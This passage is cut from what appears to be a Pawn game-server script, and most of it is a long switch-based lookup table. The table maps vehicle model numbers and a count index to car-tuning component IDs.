				case 13: { componentid = 1023; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1142; }
				case 33: { componentid = 1143; }
			}
		}
		case 500:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1013; }
				case 5: { componentid = 1019; }
				case 6: { componentid = 1020; }
				case 7: { componentid = 1021; }
				case 8: { componentid = 1024; }
				case 9: { componentid = 1025; }
				case 10: { componentid = 1073; }
				case 11: { componentid = 1074; }
				case 12: { componentid = 1075; }
				case 13: { componentid = 1076; }
				case 14: { componentid = 1077; }
				case 15: { componentid = 1078; }
				case 16: { componentid = 1079; }
				case 17: { componentid = 1080; }
				case 18: { componentid = 1081; }
				case 19: { componentid = 1082; }
				case 20: { componentid = 1083; }
				case 21: { componentid = 1084; }
				case 22: { componentid = 1085; }
				case 23: { componentid = 1087; }
				case 24: { componentid = 1096; }
				case 25: { componentid = 1097; }
				case 26: { componentid = 1098; }
			}
		}
		case 516:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1002; }
				case 3: { componentid = 1004; }
				case 4: { componentid = 1007; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1015; }
				case 9: { componentid = 1016; }
				case 10: { componentid = 1017; }
				case 11: { componentid = 1018; }
				case 12: { componentid = 1019; }
				case 13: { componentid = 1020; }
				case 14: { componentid = 1021; }
				case 15: { componentid = 1025; }
				case 16: { componentid = 1073; }
				case 17: { componentid = 1074; }
				case 18: { componentid = 1075; }
				case 19: { componentid = 1076; }
				case 20: { componentid = 1077; }
				case 21: { componentid = 1078; }
				case 22: { componentid = 1079; }
				case 23: { componentid = 1080; }
				case 24: { componentid = 1081; }
				case 25: { componentid = 1082; }
				case 26: { componentid = 1083; }
				case 27: { componentid = 1084; }
				case 28: { componentid = 1085; }
				case 29: { componentid = 1087; }
				case 30: { componentid = 1096; }
				case 31: { componentid = 1097; }
				case 32: { componentid = 1098; }
			}
		}
		case 517:
		{
			switch(count)
			{
				case 1: { componentid = 1002; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1016; }
				case 8: { componentid = 1017; }
				case 9: { componentid = 1018; }
				case 10: { componentid = 1019; }
				case 11: { componentid = 1020; }
				case 12: { componentid = 1023; }
				case 13: { componentid = 1025; }
				case 14: { componentid = 1073; }
				case 15: { componentid = 1074; }
				case 16: { componentid = 1075; }
				case 17: { componentid = 1076; }
				case 18: { componentid = 1077; }
				case 19: { componentid = 1078; }
				case 20: { componentid = 1079; }
				case 21: { componentid = 1080; }
				case 22: { componentid = 1081; }
				case 23: { componentid = 1082; }
				case 24: { componentid = 1083; }
				case 25: { componentid = 1084; }
				case 26: { componentid = 1085; }
				case 27: { componentid = 1087; }
				case 28: { componentid = 1096; }
				case 29: { componentid = 1097; }
				case 30: { componentid = 1098; }
				case 31: { componentid = 1142; }
				case 32: { componentid = 1143; }
				case 33: { componentid = 1144; }
				case 34: { componentid = 1145; }
			}
		}
		case 518:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1005; }
				case 4: { componentid = 1006; }
				case 5: { componentid = 1007; }
				case 6: { componentid = 1008; }
				case 7: { componentid = 1009; }
				case 8: { componentid = 1010; }
				case 9: { componentid = 1013; }
				case 10: { componentid = 1017; }
				case 11: { componentid = 1018; }
				case 12: { componentid = 1020; }
				case 13: { componentid = 1023; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1142; }
				case 33: { componentid = 1143; }
				case 34: { componentid = 1144; }
				case 35: { componentid = 1145; }
			}
		}
		case 527:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1007; }
				case 3: { componentid = 1008; }
				case 4: { componentid = 1009; }
				case 5: { componentid = 1010; }
				case 6: { componentid = 1014; }
				case 7: { componentid = 1015; }
				case 8: { componentid = 1017; }
				case 9: { componentid = 1018; }
				case 10: { componentid = 1020; }
				case 11: { componentid = 1021; }
				case 12: { componentid = 1025; }
				case 13: { componentid = 1073; }
				case 14: { componentid = 1074; }
				case 15: { componentid = 1075; }
				case 16: { componentid = 1076; }
				case 17: { componentid = 1077; }
				case 18: { componentid = 1078; }
				case 19: { componentid = 1079; }
				case 20: { componentid = 1080; }
				case 21: { componentid = 1081; }
				case 22: { componentid = 1082; }
				case 23: { componentid = 1083; }
				case 24: { componentid = 1084; }
				case 25: { componentid = 1085; }
				case 26: { componentid = 1087; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
			}
		}
		case 529:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1006; }
				case 4: { componentid = 1007; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1011; }
				case 9: { componentid = 1012; }
				case 10: { componentid = 1017; }
				case 11: { componentid = 1018; }
				case 12: { componentid = 1019; }
				case 13: { componentid = 1020; }
				case 14: { componentid = 1023; }
				case 15: { componentid = 1025; }
				case 16: { componentid = 1073; }
				case 17: { componentid = 1074; }
				case 18: { componentid = 1075; }
				case 19: { componentid = 1076; }
				case 20: { componentid = 1077; }
				case 21: { componentid = 1078; }
				case 22: { componentid = 1079; }
				case 23: { componentid = 1080; }
				case 24: { componentid = 1081; }
				case 25: { componentid = 1082; }
				case 26: { componentid = 1083; }
				case 27: { componentid = 1084; }
				case 28: { componentid = 1085; }
				case 29: { componentid = 1087; }
				case 30: { componentid = 1096; }
				case 31: { componentid = 1097; }
				case 32: { componentid = 1098; }
			}
		}
		case 534:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1073; }
				case 6: { componentid = 1074; }
				case 7: { componentid = 1075; }
				case 8: { componentid = 1076; }
				case 9: { componentid = 1077; }
				case 10: { componentid = 1078; }
				case 11: { componentid = 1079; }
				case 12: { componentid = 1080; }
				case 13: { componentid = 1081; }
				case 14: { componentid = 1082; }
				case 15: { componentid = 1083; }
				case 16: { componentid = 1084; }
				case 17: { componentid = 1085; }
				case 18: { componentid = 1087; }
				case 19: { componentid = 1096; }
				case 20: { componentid = 1097; }
				case 21: { componentid = 1098; }
				case 22: { componentid = 1100; }
				case 23: { componentid = 1101; }
				case 24: { componentid = 1106; }
				case 25: { componentid = 1122; }
				case 26: { componentid = 1123; }
				case 27: { componentid = 1124; }
				case 28: { componentid = 1125; }
				case 29: { componentid = 1126; }
				case 30: { componentid = 1127; }
				case 31: { componentid = 1178; }
				case 32: { componentid = 1179; }
				case 33: { componentid = 1180; }
				case 34: { componentid = 1185; }
			}
		}
		case 535:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1073; }
				case 6: { componentid = 1074; }
				case 7: { componentid = 1075; }
				case 8: { componentid = 1076; }
				case 9: { componentid = 1077; }
				case 10: { componentid = 1078; }
				case 11: { componentid = 1079; }
				case 12: { componentid = 1080; }
				case 13: { componentid = 1081; }
				case 14: { componentid = 1082; }
				case 15: { componentid = 1083; }
				case 16: { componentid = 1084; }
				case 17: { componentid = 1085; }
				case 18: { componentid = 1087; }
				case 19: { componentid = 1096; }
				case 20: { componentid = 1097; }
				case 21: { componentid = 1098; }
				case 22: { componentid = 1109; }
				case 23: { componentid = 1110; }
				case 24: { componentid = 1113; }
				case 25: { componentid = 1114; }
				case 26: { componentid = 1115; }
				case 27: { componentid = 1116; }
				case 28: { componentid = 1117; }
				case 29: { componentid = 1118; }
				case 30: { componentid = 1119; }
				case 31: { componentid = 1120; }
				case 32: { componentid = 1121; }
			}
		}
		case 536:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1073; }
				case 6: { componentid = 1074; }
				case 7: { componentid = 1075; }
				case 8: { componentid = 1076; }
				case 9: { componentid = 1077; }
				case 10: { componentid = 1078; }
				case 11: { componentid = 1079; }
				case 12: { componentid = 1080; }
				case 13: { componentid = 1081; }
				case 14: { componentid = 1082; }
				case 15: { componentid = 1083; }
				case 16: { componentid = 1084; }
				case 17: { componentid = 1085; }
				case 18: { componentid = 1087; }
				case 19: { componentid = 1096; }
				case 20: { componentid = 1097; }
				case 21: { componentid = 1098; }
				case 22: { componentid = 1103; }
				case 23: { componentid = 1104; }
				case 24: { componentid = 1105; }
				case 25: { componentid = 1107; }
				case 26: { componentid = 1108; }
				case 27: { componentid = 1128; }
				case 28: { componentid = 1181; }
				case 29: { componentid = 1182; }
				case 30: { componentid = 1183; }
				case 31: { componentid = 1184; }
			}
		}
		case 540:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1004; }
				case 3: { componentid = 1006; }
				case 4: { componentid = 1007; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1017; }
				case 9: { componentid = 1018; }
				case 10: { componentid = 1019; }
				case 11: { componentid = 1020; }
				case 12: { componentid = 1023; }
				case 13: { componentid = 1024; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1142; }
				case 33: { componentid = 1143; }
				case 34: { componentid = 1144; }
				case 35: { componentid = 1145; }
			}
		}
		case 542:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1014; }
				case 5: { componentid = 1015; }
				case 6: { componentid = 1018; }
				case 7: { componentid = 1019; }
				case 8: { componentid = 1020; }
				case 9: { componentid = 1021; }
				case 10: { componentid = 1025; }
				case 11: { componentid = 1073; }
				case 12: { componentid = 1074; }
				case 13: { componentid = 1075; }
				case 14: { componentid = 1076; }
				case 15: { componentid = 1077; }
				case 16: { componentid = 1078; }
				case 17: { componentid = 1079; }
				case 18: { componentid = 1080; }
				case 19: { componentid = 1081; }
				case 20: { componentid = 1082; }
				case 21: { componentid = 1083; }
				case 22: { componentid = 1084; }
				case 23: { componentid = 1085; }
				case 24: { componentid = 1087; }
				case 25: { componentid = 1096; }
				case 26: { componentid = 1097; }
				case 27: { componentid = 1098; }
				case 28: { componentid = 1144; }
				case 29: { componentid = 1145; }
			}
		}
		case 546:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1002; }
				case 3: { componentid = 1004; }
				case 4: { componentid = 1006; }
				case 5: { componentid = 1007; }
				case 6: { componentid = 1008; }
				case 7: { componentid = 1009; }
				case 8: { componentid = 1010; }
				case 9: { componentid = 1017; }
				case 10: { componentid = 1018; }
				case 11: { componentid = 1019; }
				case 12: { componentid = 1023; }
				case 13: { componentid = 1024; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1142; }
				case 33: { componentid = 1143; }
				case 34: { componentid = 1144; }
				case 35: { componentid = 1145; }
			}
		}
		case 547:
		{
			switch(count)
			{
				case 1: { componentid = 1000; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1008; }
				case 4: { componentid = 1009; }
				case 5: { componentid = 1010; }
				case 6: { componentid = 1016; }
				case 7: { componentid = 1018; }
				case 8: { componentid = 1019; }
				case 9: { componentid = 1020; }
				case 10: { componentid = 1021; }
				case 11: { componentid = 1025; }
				case 12: { componentid = 1073; }
				case 13: { componentid = 1074; }
				case 14: { componentid = 1075; }
				case 15: { componentid = 1076; }
				case 16: { componentid = 1077; }
				case 17: { componentid = 1078; }
				case 18: { componentid = 1079; }
				case 19: { componentid = 1080; }
				case 20: { componentid = 1081; }
				case 21: { componentid = 1082; }
				case 22: { componentid = 1083; }
				case 23: { componentid = 1084; }
				case 24: { componentid = 1085; }
				case 25: { componentid = 1087; }
				case 26: { componentid = 1096; }
				case 27: { componentid = 1097; }
				case 28: { componentid = 1098; }
				case 29: { componentid = 1142; }
				case 30: { componentid = 1143; }
			}
		}
		case 549:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1011; }
				case 8: { componentid = 1012; }
				case 9: { componentid = 1017; }
				case 10: { componentid = 1018; }
				case 11: { componentid = 1019; }
				case 12: { componentid = 1020; }
				case 13: { componentid = 1023; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1142; }
				case 33: { componentid = 1143; }
				case 34: { componentid = 1144; }
				case 35: { componentid = 1145; }
			}
		}
		case 550:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1004; }
				case 4: { componentid = 1005; }
				case 5: { componentid = 1006; }
				case 6: { componentid = 1008; }
				case 7: { componentid = 1009; }
				case 8: { componentid = 1010; }
				case 9: { componentid = 1018; }
				case 10: { componentid = 1019; }
				case 11: { componentid = 1020; }
				case 12: { componentid = 1023; }
				case 13: { componentid = 1025; }
				case 14: { componentid = 1073; }
				case 15: { componentid = 1074; }
				case 16: { componentid = 1075; }
				case 17: { componentid = 1076; }
				case 18: { componentid = 1077; }
				case 19: { componentid = 1078; }
				case 20: { componentid = 1079; }
				case 21: { componentid = 1080; }
				case 22: { componentid = 1081; }
				case 23: { componentid = 1082; }
				case 24: { componentid = 1083; }
				case 25: { componentid = 1084; }
				case 26: { componentid = 1085; }
				case 27: { componentid = 1087; }
				case 28: { componentid = 1096; }
				case 29: { componentid = 1097; }
				case 30: { componentid = 1098; }
				case 31: { componentid = 1142; }
				case 32: { componentid = 1143; }
				case 33: { componentid = 1144; }
				case 34: { componentid = 1145; }
			}
		}
		case 551:
		{
			switch(count)
			{
				case 1: { componentid = 1002; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1005; }
				case 4: { componentid = 1006; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1016; }
				case 9: { componentid = 1018; }
				case 10: { componentid = 1019; }
				case 11: { componentid = 1020; }
				case 12: { componentid = 1021; }
				case 13: { componentid = 1023; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
			}
		}
		case 558:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1073; }
				case 6: { componentid = 1074; }
				case 7: { componentid = 1075; }
				case 8: { componentid = 1076; }
				case 9: { componentid = 1077; }
				case 10: { componentid = 1078; }
				case 11: { componentid = 1079; }
				case 12: { componentid = 1080; }
				case 13: { componentid = 1081; }
				case 14: { componentid = 1082; }
				case 15: { componentid = 1083; }
				case 16: { componentid = 1084; }
				case 17: { componentid = 1085; }
				case 18: { componentid = 1087; }
				case 19: { componentid = 1088; }
				case 20: { componentid = 1089; }
				case 21: { componentid = 1090; }
				case 22: { componentid = 1091; }
				case 23: { componentid = 1092; }
				case 24: { componentid = 1093; }
				case 25: { componentid = 1094; }
				case 26: { componentid = 1095; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
				case 30: { componentid = 1163; }
				case 31: { componentid = 1164; }
				case 32: { componentid = 1165; }
				case 33: { componentid = 1166; }
				case 34: { componentid = 1167; }
				case 35: { componentid = 1168; }
			}
		}
		case 559:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1065; }
				case 6: { componentid = 1066; }
				case 7: { componentid = 1067; }
				case 8: { componentid = 1068; }
				case 9: { componentid = 1069; }
				case 10: { componentid = 1070; }
				case 11: { componentid = 1071; }
				case 12: { componentid = 1072; }
				case 13: { componentid = 1073; }
				case 14: { componentid = 1074; }
				case 15: { componentid = 1075; }
				case 16: { componentid = 1076; }
				case 17: { componentid = 1077; }
				case 18: { componentid = 1078; }
				case 19: { componentid = 1079; }
				case 20: { componentid = 1080; }
				case 21: { componentid = 1081; }
				case 22: { componentid = 1082; }
				case 23: { componentid = 1083; }
				case 24: { componentid = 1084; }
				case 25: { componentid = 1085; }
				case 26: { componentid = 1087; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
				case 30: { componentid = 1158; }
				case 31: { componentid = 1159; }
				case 32: { componentid = 1160; }
				case 33: { componentid = 1161; }
				case 34: { componentid = 1162; }
				case 35: { componentid = 1173; }
			}
		}
		case 560:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1026; }
				case 6: { componentid = 1027; }
				case 7: { componentid = 1028; }
				case 8: { componentid = 1029; }
				case 9: { componentid = 1030; }
				case 10: { componentid = 1031; }
				case 11: { componentid = 1032; }
				case 12: { componentid = 1033; }
				case 13: { componentid = 1073; }
				case 14: { componentid = 1074; }
				case 15: { componentid = 1075; }
				case 16: { componentid = 1076; }
				case 17: { componentid = 1077; }
				case 18: { componentid = 1078; }
				case 19: { componentid = 1079; }
				case 20: { componentid = 1080; }
				case 21: { componentid = 1081; }
				case 22: { componentid = 1082; }
				case 23: { componentid = 1083; }
				case 24: { componentid = 1084; }
				case 25: { componentid = 1085; }
				case 26: { componentid = 1087; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
				case 30: { componentid = 1138; }
				case 31: { componentid = 1139; }
				case 32: { componentid = 1140; }
				case 33: { componentid = 1141; }
				case 34: { componentid = 1169; }
				case 35: { componentid = 1170; }
			}
		}
		case 561:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1055; }
				case 6: { componentid = 1056; }
				case 7: { componentid = 1057; }
				case 8: { componentid = 1058; }
				case 9: { componentid = 1059; }
				case 10: { componentid = 1060; }
				case 11: { componentid = 1061; }
				case 12: { componentid = 1062; }
				case 13: { componentid = 1063; }
				case 14: { componentid = 1064; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1154; }
				case 33: { componentid = 1155; }
				case 34: { componentid = 1156; }
				case 35: { componentid = 1157; }
			}
		}
		case 562:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1034; }
				case 6: { componentid = 1035; }
				case 7: { componentid = 1036; }
				case 8: { componentid = 1037; }
				case 9: { componentid = 1038; }
				case 10: { componentid = 1039; }
				case 11: { componentid = 1040; }
				case 12: { componentid = 1041; }
				case 13: { componentid = 1073; }
				case 14: { componentid = 1074; }
				case 15: { componentid = 1075; }
				case 16: { componentid = 1076; }
				case 17: { componentid = 1077; }
				case 18: { componentid = 1078; }
				case 19: { componentid = 1079; }
				case 20: { componentid = 1080; }
				case 21: { componentid = 1081; }
				case 22: { componentid = 1082; }
				case 23: { componentid = 1083; }
				case 24: { componentid = 1084; }
				case 25: { componentid = 1085; }
				case 26: { componentid = 1087; }
				case 27: { componentid = 1096; }
				case 28: { componentid = 1097; }
				case 29: { componentid = 1098; }
				case 30: { componentid = 1146; }
				case 31: { componentid = 1147; }
				case 32: { componentid = 1148; }
				case 33: { componentid = 1149; }
				case 34: { componentid = 1171; }
				case 35: { componentid = 1172; }
			}
		}
		case 565:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1045; }
				case 6: { componentid = 1046; }
				case 7: { componentid = 1047; }
				case 8: { componentid = 1048; }
				case 9: { componentid = 1049; }
				case 10: { componentid = 1050; }
				case 11: { componentid = 1051; }
				case 12: { componentid = 1052; }
				case 13: { componentid = 1053; }
				case 14: { componentid = 1054; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1150; }
				case 33: { componentid = 1151; }
				case 34: { componentid = 1152; }
				case 35: { componentid = 1153; }
			}
		}
		case 567:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1073; }
				case 6: { componentid = 1074; }
				case 7: { componentid = 1075; }
				case 8: { componentid = 1076; }
				case 9: { componentid = 1077; }
				case 10: { componentid = 1078; }
				case 11: { componentid = 1079; }
				case 12: { componentid = 1080; }
				case 13: { componentid = 1081; }
				case 14: { componentid = 1082; }
				case 15: { componentid = 1083; }
				case 16: { componentid = 1084; }
				case 17: { componentid = 1085; }
				case 18: { componentid = 1087; }
				case 19: { componentid = 1096; }
				case 20: { componentid = 1097; }
				case 21: { componentid = 1098; }
				case 22: { componentid = 1102; }
				case 23: { componentid = 1129; }
				case 24: { componentid = 1130; }
				case 25: { componentid = 1131; }
				case 26: { componentid = 1132; }
				case 27: { componentid = 1133; }
				case 28: { componentid = 1186; }
				case 29: { componentid = 1187; }
				case 30: { componentid = 1188; }
				case 31: { componentid = 1189; }
			}
		}
		case 575:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1042; }
				case 6: { componentid = 1043; }
				case 7: { componentid = 1044; }
				case 8: { componentid = 1073; }
				case 9: { componentid = 1074; }
				case 10: { componentid = 1075; }
				case 11: { componentid = 1076; }
				case 12: { componentid = 1077; }
				case 13: { componentid = 1078; }
				case 14: { componentid = 1079; }
				case 15: { componentid = 1080; }
				case 16: { componentid = 1081; }
				case 17: { componentid = 1082; }
				case 18: { componentid = 1083; }
				case 19: { componentid = 1084; }
				case 20: { componentid = 1085; }
				case 21: { componentid = 1087; }
				case 22: { componentid = 1096; }
				case 23: { componentid = 1097; }
				case 24: { componentid = 1098; }
				case 25: { componentid = 1099; }
				case 26: { componentid = 1174; }
				case 27: { componentid = 1175; }
				case 28: { componentid = 1176; }
				case 29: { componentid = 1177; }
			}
		}
		case 576:
		{
			switch(count)
			{
				case 1: { componentid = 1008; }
				case 2: { componentid = 1009; }
				case 3: { componentid = 1010; }
				case 4: { componentid = 1025; }
				case 5: { componentid = 1073; }
				case 6: { componentid = 1074; }
				case 7: { componentid = 1075; }
				case 8: { componentid = 1076; }
				case 9: { componentid = 1077; }
				case 10: { componentid = 1078; }
				case 11: { componentid = 1079; }
				case 12: { componentid = 1080; }
				case 13: { componentid = 1081; }
				case 14: { componentid = 1082; }
				case 15: { componentid = 1083; }
				case 16: { componentid = 1084; }
				case 17: { componentid = 1085; }
				case 18: { componentid = 1087; }
				case 19: { componentid = 1096; }
				case 20: { componentid = 1097; }
				case 21: { componentid = 1098; }
				case 22: { componentid = 1134; }
				case 23: { componentid = 1135; }
				case 24: { componentid = 1136; }
				case 25: { componentid = 1137; }
				case 26: { componentid = 1190; }
				case 27: { componentid = 1191; }
				case 28: { componentid = 1192; }
				case 29: { componentid = 1193; }
			}
		}
		case 580:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1006; }
				case 3: { componentid = 1007; }
				case 4: { componentid = 1008; }
				case 5: { componentid = 1009; }
				case 6: { componentid = 1010; }
				case 7: { componentid = 1017; }
				case 8: { componentid = 1018; }
				case 9: { componentid = 1020; }
				case 10: { componentid = 1023; }
				case 11: { componentid = 1025; }
				case 12: { componentid = 1073; }
				case 13: { componentid = 1074; }
				case 14: { componentid = 1075; }
				case 15: { componentid = 1076; }
				case 16: { componentid = 1077; }
				case 17: { componentid = 1078; }
				case 18: { componentid = 1079; }
				case 19: { componentid = 1080; }
				case 20: { componentid = 1081; }
				case 21: { componentid = 1082; }
				case 22: { componentid = 1083; }
				case 23: { componentid = 1084; }
				case 24: { componentid = 1085; }
				case 25: { componentid = 1087; }
				case 26: { componentid = 1096; }
				case 27: { componentid = 1097; }
				case 28: { componentid = 1098; }
			}
		}
		case 585:
		{
			switch(count)
			{
				case 1: { componentid = 1001; }
				case 2: { componentid = 1003; }
				case 3: { componentid = 1006; }
				case 4: { componentid = 1007; }
				case 5: { componentid = 1008; }
				case 6: { componentid = 1009; }
				case 7: { componentid = 1010; }
				case 8: { componentid = 1013; }
				case 9: { componentid = 1017; }
				case 10: { componentid = 1018; }
				case 11: { componentid = 1019; }
				case 12: { componentid = 1020; }
				case 13: { componentid = 1023; }
				case 14: { componentid = 1025; }
				case 15: { componentid = 1073; }
				case 16: { componentid = 1074; }
				case 17: { componentid = 1075; }
				case 18: { componentid = 1076; }
				case 19: { componentid = 1077; }
				case 20: { componentid = 1078; }
				case 21: { componentid = 1079; }
				case 22: { componentid = 1080; }
				case 23: { componentid = 1081; }
				case 24: { componentid = 1082; }
				case 25: { componentid = 1083; }
				case 26: { componentid = 1084; }
				case 27: { componentid = 1085; }
				case 28: { componentid = 1087; }
				case 29: { componentid = 1096; }
				case 30: { componentid = 1097; }
				case 31: { componentid = 1098; }
				case 32: { componentid = 1142; }
				case 33: { componentid = 1143; }
